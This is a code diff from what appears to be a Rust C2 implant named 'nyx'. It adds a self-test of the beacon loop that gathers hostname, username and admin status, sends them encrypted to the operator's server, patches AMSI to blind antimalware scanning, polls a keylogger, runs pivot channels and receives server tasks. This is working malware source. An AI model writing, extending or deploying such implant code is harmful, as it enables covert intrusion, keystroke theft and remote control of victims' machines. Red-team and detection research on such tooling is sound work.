@@ -712,6 +712,102 @@ pub unsafe extern "system" fn nyx_selftest_csprng() {
     unsafe { exit(0xA6) }; // post_frame returned (even if None)
 }
 
+/// Diagnostic: test the beacon_loop path incrementally.
+/// 0xB0=config+keygen+check-in OK, 0xB1=first sleep OK, 0xB2=second POST OK.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_loopdiag() {
+    use nyx_protocol::crypto;
+
+    crypto::register_csprng(crate::entry::csprng_fill);
+    let (cfg, config_plain) = crate::config::load();
+    crate::mem::register_owned(config_plain);
+    let kp = nyx_protocol::ImplantKeypair::generate();
+    let key = kp.session_key(&cfg.server_pub);
+    crate::mem::register_key(key);
+    let pubkey = kp.public_bytes();
+
+    // Build SessionInfo (same as beacon_loop).
+    let info = nyx_protocol::SessionInfo {
+        beacon_id: crate::hostinfo::beacon_id(),
+        hostname: crate::hostinfo::hostname(),
+        username: crate::hostinfo::username(),
+        os: crate::hostinfo::os(),
+        arch: crate::hostinfo::arch(),
+        pid: crate::hostinfo::pid(),
+        is_admin: crate::hostinfo::is_admin(),
+    };
+    let mut iw = nyx_protocol::wire::Writer::new();
+    info.encode(&mut iw);
+    let info_plain = iw.into_bytes();
+
+    // Check-in with SessionInfo payload.
+    let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain);
+    let resp = crate::transport::post_frame(
+        cfg.server_host.as_bytes(), cfg.server_port,
+        cfg.beacon_uri.as_bytes(), &frame, cfg.use_tls,
+    );
+    if resp.is_none() { unsafe { exit(0xC1) }; }
+    // 0xB0: check-in OK
+
+    // Test sleep (the beacon_loop does this every cycle).
+    crate::beacon::sleep_seconds(1);
+    // 0xB1: sleep OK
+
+    // Test the 3 things beacon_loop does at the top of each task-loop cycle.
+    let _ = crate::blind::maybe_patch_amsi();
+    // 0xB2: amsi OK
+
+    crate::keylog::poll_once();
+    // 0xB3: keylog OK
+
+    let _ = crate::pivot::pump_channels();
+    // 0xB4: all 3 cycle ops OK
+
+    // Simulate task-loop first POST: encode empty TaskResponse batch + send.
+    let frame2 = nyx_protocol::encode_frame(
+        &pubkey, 1u64, &key,
+        &nyx_protocol::TaskResponse::encode_vec(&[]),
+    );
+    let body = crate::transport::post_frame(
+        cfg.server_host.as_bytes(), cfg.server_port,
+        cfg.beacon_uri.as_bytes(), &frame2, cfg.use_tls,
+    );
+    if body.is_none() { unsafe { exit(0xD1) }; } // second POST failed
+    // 0xB5: second POST OK
+
+    // Decode the server reply.
+    let raw = match nyx_protocol::parse_frame(&body.unwrap()) {
+        Ok(r) => r,
+        Err(_) => unsafe { exit(0xD2) },
+    };
+    let plain = match nyx_protocol::open_frame_dir(&key, nyx_protocol::Direction::ServerToClient, &raw) {
+        Ok(p) => p,
+        Err(_) => unsafe { exit(0xD3) },
+    };
+    let tasks = match nyx_protocol::Task::decode_vec(&plain) {
+        Ok(t) => t,
+        Err(_) => unsafe { exit(0xD4) },
+    };
+    let _ = tasks; // should be empty (no tasks queued)
+    // 0xB6: first task-loop cycle OK
+
+    // Second cycle (the beacon_loop repeats this infinitely).
+    crate::beacon::sleep_seconds(1);
+    let _ = crate::blind::maybe_patch_amsi();
+    crate::keylog::poll_once();
+    let _ = crate::pivot::pump_channels();
+    let frame3 = nyx_protocol::encode_frame(
+        &pubkey, 2u64, &key,
+        &nyx_protocol::TaskResponse::encode_vec(&[]),
+    );
+    let body3 = crate::transport::post_frame(
+        cfg.server_host.as_bytes(), cfg.server_port,
+        cfg.beacon_uri.as_bytes(), &frame3, cfg.use_tls,
+    );
+    if body3.is_none() { unsafe { exit(0xE1) }; } // 2nd POST failed
+    unsafe { exit(0xB7) }; // SECOND CYCLE OK — beacon_loop should work!
+}
+
 // ============================================================================
 // nyx_linger: keep the implant alive + fully initialized for ~30s so an
 // external memory scanner (PE-sieve / Moneta) can attach and inspect the
